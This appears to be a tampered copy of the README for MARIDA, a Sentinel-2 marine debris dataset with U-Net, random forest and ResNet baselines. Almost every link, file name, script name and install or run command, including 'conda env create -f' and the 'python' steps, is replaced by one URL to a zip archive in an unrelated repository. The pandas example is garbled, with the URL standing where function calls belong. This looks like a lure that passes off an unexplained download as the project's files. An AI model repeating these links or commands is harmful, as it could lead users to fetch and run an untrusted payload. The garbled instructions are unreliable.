![Marine Debris Archive Logo](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip)

Marine Debris Archive (MARIDA) is a marine debris-oriented dataset on Sentinel-2 satellite images. 
It also includes various sea features that co-exist.
MARIDA is primarily focused on the weakly supervised pixel-level semantic segmentation task.
This repository hosts the basic tools for the extraction of spectral signatures
 as well as the code for the reproduction of the baseline models.
 
If you find this repository useful, please consider giving a star :star: and citation:
 > Kikaki K, Kakogeorgiou I, Mikeli P, Raitsos DE, Karantzalos K (2022) MARIDA: A benchmark for Marine Debris detection from Sentinel-2 remote sensing data. PLoS ONE 17(1): e0262247. https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip

In order to download MARIDA go to https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip

Alternatively, MARIDA can be downloaded from the [Radiant MLHub](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip). The `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip` archive file downloaded from this source includes the STAC catalog associated with this dataset.


## Contents

- [Installation](#installation)
	- [Installation Requirements](#installation-requirements)
	- [Installation Guide](#installation-guide)
- [Getting Started](#getting-started)
	- [Dataset Structure](#dataset-structure)
	- [Spectral Signatures Extraction](#spectral-signatures-extraction)
	- [Weakly Supervised Pixel-Level Semantic Segmentation](#weakly-supervised-pixel-Level-semantic-segmentation)
		- [Unet](#unet)
		- [Random Forest](#random-forest)
	- [Multi-label Classification](#multi-label-classification)
		- [ResNet](#resnet)
- [MARIDA - Exploratory Analysis](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip)
- [Talks and Papers](#talks-and-papers)


## Installation

### Installation Requirements
- python == 3.7.10
- pytorch == 1.7 
- cudatoolkit == 11.0 (For GPU usage, compute capability >= 3.5)
- gdal == 2.3.3
- rasterio == 1.0.21
- scikit-learn == 0.24.2
- numpy == 1.20.2
- tensorboard == 1.15
- torchvision == 0.8.0
- scikit-image == 0.18.1
- pandas == 1.2.4
- pytables == 3.6.1
- tqdm == 4.59.0


### Installation Guide

The requirements are easily installed via
[Anaconda](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip) (recommended):
```bash
conda env create -f https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
```
> If the following error occurred: InvalidVersionSpecError: Invalid version spec: =2.7 
>
> Run: conda update conda

After the installation is completed, activate the environment:
```bash
conda activate marida
```

## Getting Started

### Dataset Structure

In order to train or test the models, download [MARIDA](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip)
and extract it in the `data/` folder. The final structure should be:

    .
    ├── ...
    ├── data                                     # Main Dataset folder
    │   ├── patches                              # Folder with patches Structured by Unique Dates and S2 Tiles  
	│   │    ├── S2_DATE_TILE                    # Unique Date
	│   │    │    ├── https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip      # Unique 256 x 256 Patch 
	│   │    │    ├── https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip   # 256 x 256 Classification Mask for Semantic Segmentation Task
	│   │    │    └── https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip # 256 x 256 Annotator Confidence Level Mask
	│   │    └──  ...                        
    │   ├── splits                               # Train/Val/Test split Folder (https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip, https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip, https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip) 
    │   └── https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip                   # Mapping between Unique 256 x 256 Patch and labels for Multi-label Classification Task


The mapping in S2_DATA_TILE_CROP_cl between Digital Numbers and Classes is:

```yaml
1: 'Marine Debris',
2: 'Dense Sargassum',
3: 'Sparse Sargassum',
4: 'Natural Organic Material',
5: 'Ship',
6: 'Clouds',
7: 'Marine Water',
8: 'Sediment-Laden Water',
9: 'Foam',
10: 'Turbid Water',
11: 'Shallow Water',
12: 'Waves',
13: 'Cloud Shadows',
14: 'Wakes',
15: 'Mixed Water'
```

For the confidence level mask or other usefull mappings go to https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip

Also, in order to easily visualize the RGB composite of the S2_DATE_TILE_CROP patches via [QGIS](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip),
you can use the `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip` file.

### Spectral Signatures Extraction

For the extraction of the spectal signature of each annotated pixel and
its storage in a HDF5 Table file (DataFrame-like processing) run the following commands below. 
The output `data/dataset.h5` can be used for the spectral analysis of the dataset.
Also, this stage is required for the Random Forest training (press [here](#random-forest)). 
Note that this is not required for the Unet training. This procedure lasts approximately ~10 minutes.

```bash
python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
```

Alternatively, you can download the `dataset.h5` file from [here](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip) and put it in the `data` folder.
Finally, in order to load the `dataset.h5` with Pandas, run in a python cell the following:

```python
import pandas as pd

hdf = https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip('./data/dataset.h5', mode = 'r')

df_train = https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip('train')
df_val = https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip('val')
df_test = https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip('test')

https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip()
```

### Weakly Supervised Pixel-Level Semantic Segmentation

#### Unet

**Unet training**

Spectral Signatures Extraction in not required for this procedure.
For training in the "train" set and evaluation in "val" set with the proposed parameters, run:

```bash
cd semantic_segmentation/unet
python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
```

While training, in order to see the loss status and various metrics via tensorboard, run in a different terminal 
the following command and then go to `localhost:6006` with your browser:

```bash
tensorboard --logdir logs/tsboard_segm
```

The `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip` also supports the following argument flags:

```bash
    # Basic parameters
    --agg_to_water "Aggregate Mixed Water, Wakes, Cloud Shadows, Waves with Marine Water (True or False)"
    --mode "Select between 'train' or 'test'"
    --epochs "Number of epochs to run"
    --batch "Batch size"
    --resume_from_epoch "Load model from previous epoch (To continue the training)"
    
    # Unet
    --input_channels "The number of input bands"
    --output_channels "The number of output classes"
    --hidden_channels "The number of hidden features"

    # Optimization
    --weight_param "Weighting parameter for Loss Function"
    --lr "Learning rate for adam"
    --decay "Learning rate decay for adam"
    --reduce_lr_on_plateau "Reduce learning rate when val loss no decrease (0 or 1)"
    --lr_steps "Specify the steps that the lr will be reduced"

    # Evaluation/Checkpointing
    --checkpoint_path "The folder to save checkpoints into."
    --eval_every "How frequently to run evaluation (epochs)"

    # misc
    --num_workers "How many cpus for loading data (0 is the main process)"
    --pin_memory "Use pinned memory or not"
    --prefetch_factor "Number of sample loaded in advance by each worker"
    --persistent_workers "This allows to maintain the workers Dataset instances alive"
    --tensorboard "Name for tensorboard run"
```

**Unet evaluation**

Run the following commands in order to produce the Confusion Matrix in stdout and `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip`,
 as well as to produce the predicted masks from the test set in `data/predicted_unet/` folder:

```bash
cd semantic_segmentation/unet
python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
```

In order to easily visualize the predicted masks via [QGIS](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip),
you can use the `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip` file.

To download the pretrained Unet model on MARIDA press [here](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip). 
Then, you should put these items in the `semantic_segmentation/unet/trained_models/` folder.

#### Random Forest

In our baseline setup we trained a random forest classifier on Spectral Signatures,
produced Spectral Indices (SI) and extracted Gray-Level Co-occurrence Matrix (GLCM) texture features.
Thus, this process requires the Spectral Signatures Extraction i.e., the `data/dataset.h5` [file](#spectral-signatures-extraction). Also, it requires the `dataset_si.h5` and `dataset_glcm.h5` for SI and GLCM features,
respectively.

1) For the extraction of stacked SI patches (in `data/indices/`) run:

```bash
cd semantic_segmentation/random_forest
python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
```

Then, in order to produce the `dataset_si.h5` run:

```bash
python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip --type indices
```

2) For the stacked GLCM patches (in `data/texture/`) run (approximately ~ 110 mins):

```bash
python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip --type texture
```

Similarly, in order to produce the `dataset_glcm.h5` run:

```bash
python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip --type texture
```

 Alternatively, you can download the `indices/` and `texture/` folders as well as the `dataset_si.h5` and `dataset_glcm.h5` files from [here](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip). 
Then, you should put these items in the `data` folder.

**Random Forest training and evaluation**

For training in "train" set and final evaluation in "test" set, run the following commands.
Note that the results will appear in stdout and `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip`, and the predicted 
masks in `data/predicted_rf/` folder.

```bash
cd semantic_segmentation\random_forest
python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
```

The `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip` supports the `--agg_to_water` argument for 
the aggregation of various classes to form the Water Super Class (The default setup):

```bash
python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip --agg_to_water ['"Mixed Water"','"Wakes"','"Cloud Shadows"','"Waves"']
```

### Multi-label Classification

The weakly-supervised multi-label classification task is an incomplete multi-label
assignment problem. Specifically, the assigned labels are definitely positive (assigned as 1),
 while the absent labels (assigned as 0) are not necessarily negative. The assigned labels
 per patch can be found in `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip`

#### ResNet

**ResNet training**

For training in "train" set and evaluation in "val" set, run:

```bash
cd multi-label/resnet
python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
```

Similarly to U-Net training, you can use tensorboard thought `localhost:6006` 
to visualize the training process:

```
tensorboard --logdir logs/tsboard_multilabel
```

**ResNet evaluation**

Run the following commands in order to produce the accuracy scores and the Confusion Matrix in stdout 
and `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip`, as well as to produce the predictions for each patch from the test 
set in `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip`:

```bash
python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
```

To download the pretrained ResNet model on MARIDA press [here](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip). 
Then, you should put these items in the `multi-label/resnet/trained_models/` folder.

## Presentations
[Kikaki A, Kakogeorgiou I, Mikeli P, Raitsos DE, Karantzalos K. Detecting and Classifying Marine Plastic Debris from high-resolution multispectral satellite data.](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip)

## License
This project is licensed under the MIT License.
